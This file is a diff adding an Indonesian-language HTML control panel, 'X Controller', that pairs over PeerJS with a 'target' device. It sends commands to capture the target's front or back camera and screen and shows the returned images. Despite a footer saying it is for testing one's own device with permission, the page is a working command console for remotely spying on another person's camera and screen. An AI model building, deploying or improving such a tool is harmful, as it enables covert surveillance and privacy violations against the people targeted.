@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>X Controller • Remote Command</title>
+    <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
+    <style>
+        body {
+            background: #0a0f1a;
+            font-family: 'Segoe UI', monospace;
+            color: #eee;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+        }
+        .card {
+            background: #1e293b;
+            border-radius: 32px;
+            padding: 25px;
+            max-width: 600px;
+            width: 100%;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+        }
+        h1 { color: #f97316; margin-bottom: 5px; }
+        .pairing {
+            background: #0f172f;
+            padding: 15px;
+            border-radius: 20px;
+            text-align: center;
+            margin: 20px 0;
+        }
+        .pairing-code {
+            font-size: 2rem;
+            font-weight: bold;
+            letter-spacing: 4px;
+            background: #00000055;
+            padding: 10px;
+            border-radius: 16px;
+        }
+        button {
+            background: #f97316;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 40px;
+            font-weight: bold;
+            margin: 8px;
+            cursor: pointer;
+        }
+        .btn-group {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-top: 20px;
+        }
+        .status {
+            background: #0f172f;
+            padding: 10px;
+            border-radius: 20px;
+            margin-top: 15px;
+            font-size: 0.8rem;
+        }
+        img {
+            max-width: 100%;
+            border-radius: 20px;
+            margin-top: 15px;
+            border: 2px solid #f97316;
+        }
+        footer {
+            font-size: 0.7rem;
+            text-align: center;
+            margin-top: 25px;
+            color: #777;
+        }
+    </style>
+</head>
+<body>
+<div class="card">
+    <h1>🎮 X CONTROLLER</h1>
+    <p>Kirim perintah ke target (pairing code)</p>
+    <div class="pairing">
+        <div>📡 PAIRING CODE (ID Anda)</div>
+        <div class="pairing-code" id="myPeerId">Loading...</div>
+        <small>Kirim kode ini ke target untuk diinput di web target</small>
+    </div>
+
+    <div class="status" id="connStatus">🔴 Menunggu target terhubung...</div>
+
+    <div class="btn-group">
+        <button id="frontCam">📷 Kamera Depan</button>
+        <button id="backCam">📸 Kamera Belakang</button>
+        <button id="screenRec">🖥️ Rekam Layar</button>
+        <button id="flashBtn">⚡ Flash (efek layar putih)</button>
+    </div>
+
+    <div id="resultArea">
+        <h3>📸 Hasil dari target:</h3>
+        <img id="resultImage" style="display:none;">
+    </div>
+    <footer>⚠️ Hanya untuk pengujian perangkat sendiri. Setiap aksi memerlukan izin di target.</footer>
+</div>
+
+<script>
+    // Inisialisasi PeerJS (menggunakan public signaling server)
+    const peer = new Peer({ config: { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] } });
+    let conn = null;       // data channel
+    let targetPeerId = null;
+
+    const myIdSpan = document.getElementById('myPeerId');
+    const connStatus = document.getElementById('connStatus');
+
+    peer.on('open', (id) => {
+        myIdSpan.innerText = id;
+    });
+
+    peer.on('connection', (incomingConn) => {
+        conn = incomingConn;
+        targetPeerId = conn.peer;
+        connStatus.innerHTML = `✅ Target terhubung! ID: ${targetPeerId}`;
+        
+        conn.on('data', (data) => {
+            // Terima gambar dari target (base64)
+            if (data.type === 'image') {
+                const img = document.getElementById('resultImage');
+                img.src = data.payload;
+                img.style.display = 'block';
+            } else if (data.type === 'log') {
+                connStatus.innerHTML += `<br>📝 ${data.payload}`;
+            }
+        });
+        conn.on('close', () => {
+            connStatus.innerHTML = '🔴 Target terputus.';
+            targetPeerId = null;
+        });
+    });
+
+    function sendCommand(action, payload = {}) {
+        if (!conn || conn.open === false) {
+            alert("Belum ada target yang terhubung. Pastikan target sudah memasukkan pairing code Anda.");
+            return;
+        }
+        conn.send({ action, payload });
+    }
+
+    document.getElementById('frontCam').onclick = () => sendCommand('camera', { facing: 'user' });
+    document.getElementById('backCam').onclick = () => sendCommand('camera', { facing: 'environment' });
+    document.getElementById('screenRec').onclick = () => sendCommand('screenshot');
+    document.getElementById('flashBtn').onclick = () => sendCommand('flash');
+</script>
+</body>
+</html>
